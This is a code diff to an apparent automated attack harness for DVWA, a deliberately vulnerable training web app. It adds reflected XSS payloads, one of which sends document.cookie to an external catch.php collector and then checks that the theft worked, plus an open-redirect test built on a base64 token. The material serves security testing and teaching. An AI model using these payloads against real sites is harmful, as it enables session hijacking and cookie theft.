@@ -31,6 +31,7 @@ import vars
 import wafw00f
 import itertools
 import urllib
+import urllib2
 import logging
 import multiprocessing
 from HTMLGenerator import HTMLGenerator
@@ -309,15 +310,16 @@ class DVWAAttacks:
             you should see the browser pop up with a javascript alert
             popup exposing the document.cookie data
         """
-        funcs.attackOutPut(funcs.stepThree, "step", "Attempting to display an XSS Attack leading to a leak of Session ID data")
-        xssurl = self.url + self.apppath + "vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E#"
-        try:
-            webbrowser.open(xssurl, new=2, autoraise=True)
-            funcs.attackOutPut(funcs.stepThree, "step", "A browser window/tab should have opened up with a javascript popup displaying the leak")
-        except webbrowser.Error:
-            funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - check out '%s' manually" % xssurl)
+        if vars.getUseBrowser():
+            funcs.attackOutPut(funcs.stepThree, "step", "Attempting to display an XSS Attack leading to a leak of Session ID data")
+            xssurl = self.url + self.apppath + "vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E#"
+            try:
+                webbrowser.open(xssurl, new=2, autoraise=True)
+                funcs.attackOutPut(funcs.stepThree, "step", "A browser window/tab should have opened up with a javascript popup displaying the leak")
+            except webbrowser.Error:
+                funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - check out '%s' manually" % xssurl)
+            time.sleep(8)
         #################################################################################
-        time.sleep(8)
         """
             this one will use a different XSS to expose a Session ID
             by sending it to a remote PHP page that records the data
@@ -325,13 +327,37 @@ class DVWAAttacks:
             have real javascript support just yet
         """
         try:
-            funcs.attackOutPut(funcs.stepThree, "step", "Attempting to display an XSS Attack leading to a leak of Session ID data")
-            webbrowser.open(self.url + self.apppath + "vulnerabilities/xss_r/?name=%3Cscript%3Enew+Image%28%29.src%3D%22" + vars.exturl + vars.extpath + "catch.php%3Fcookie%3D%22%2BencodeURI%28document.cookie%29%3B%3C%2Fscript%3E")
+            funcs.attackOutPut(funcs.stepThree, "step", "Attempting to leak Session ID data via XSS")
+            if vars.getUseBrowser():
+                webbrowser.open(self.url + self.apppath + "vulnerabilities/xss_r/?name=%3Cscript%3Enew+Image%28%29.src%3D%22" + vars.exturl + vars.extpath + "catch.php%3Fcookie%3D%22%2BencodeURI%28document.cookie%29%3B%3C%2Fscript%3E")
+            
+            stamp = funcs.createRandAlpha(length=30)
+            response = ""
+            encoded = ""
+            query_args = {'name':'<script>new Image().src="' + vars.getExtUrl() + 'catch.php?'}
+            encoded += urllib.urlencode(query_args)
+            query_args = {'cookie':'+encodeURI(document.cookie);</script>'}
+            encoded += urllib.urlencode(query_args)
+            query_args = {'stamp':stamp}
+            encoded += urllib.urlencode(query_args)
+            urllib2.urlopen(self.url + self.apppath + "vulnerabilities/xss_r/?" + encoded)
             time.sleep(8)
-            webbrowser.open(vars.exturl + vars.extpath + "catch.php", new=2, autoraise=True)
-            funcs.attackOutPut(funcs.stepThree, "step", "A browser window/tab should have opened up with leaked session data in an external page")
+            
+            if vars.getUseBrowser():
+                webbrowser.open(vars.getExtUrl() + "catch.php", new=2, autoraise=True)
+                funcs.attackOutPut(funcs.stepThree, "step", "A browser window/tab should have opened up with leaked session data in an external page")
+            try:
+                response = urllib2.urlopen(vars.getExtUrl() + "catch.php")
+                if stamp in response:
+                    self.htmlgen.writeHtmlTableCell(success=True, attackType="Expose Session",
+                                                    target=self.url + self.apppath + "vulnerabilities/xss_r/", vect=encoded)
+                else:
+                    self.htmlgen.writeHtmlTableCell(success=False, attackType="Expose Session",
+                                                    target=self.url + self.apppath + "vulnerabilities/xss_r/", vect=encoded)
+            except:
+                pass
         except webbrowser.Error:
-            funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - check out %s" % vars.exturl + vars.extpath + "catch.php")
+            funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - check out %s" % vars.getExtUrl() + "catch.php")
         #################################################################################
         return None
     # EOF
@@ -1181,12 +1207,19 @@ class DVWAAttacks:
     """
     def attackredir(self, fp, targetpage):
         """
-            # http://target/dvwa/vulnerabilities/redir/?token=aHR0cDovL3NlYy5uZXVyb2Z1enotc29mdHdhcmUuY29tL2U0NTg5ZWZmZjY1NGQ5MWUyNmI0MzMzM2RiZjQxNDI1L3lvdXNob3VsZG5vdGJlaGVyZS5waHA=
+            the redir URL will look something like this:
+            # http://target/dvwa/vulnerabilities/redir/?token=aHR0cDovL3lvdXNob3VsZG5vdGJlaGVyZS5iYXlzaG9yZW5ldHdvcmtzLmNvbS5jb20vZTQ1ODllZmZmNjU0ZDkxZTI2YjQzMzMzZGJmNDE0MjUveW91c2hvdWxkbm90YmVoZXJlLnBocA==
+            
+            where the token value:
+                
+                'aHR0cDovL3lvdXNob3VsZG5vdGJlaGVyZS5iYXlzaG9yZW5ldHdvcmtzLmNvbS9lNDU4OWVmZmY2NTRkOTFlMjZiNDMzMzNkYmY0MTQyNS95b3VzaG91bGRub3RiZWhlcmUucGhw'
+            
+            equals: http://youshouldnotbehere.bayshorenetworks.com/e4589efff654d91e26b43333dbf41425/youshouldnotbehere.php
         """
         funcs.attackOutPut(funcs.stepThree, "step", "Attempting use a browser window/tab to simulate a redirect outside the target application")
         try:
             time.sleep(8)
-            webbrowser.open(targetpage + "?token=" + vars.redirtoken)
+            webbrowser.open(targetpage + "?token=" + vars.getRedirToken())
             funcs.attackOutPut(funcs.stepThree, "step", "Check your browser to see if a redirect to a potentially malicious page took place")
         except webbrowser.Error:
             funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - hit this manually: %s" % targetpage + "?token=" +  + vars.redirtoken)
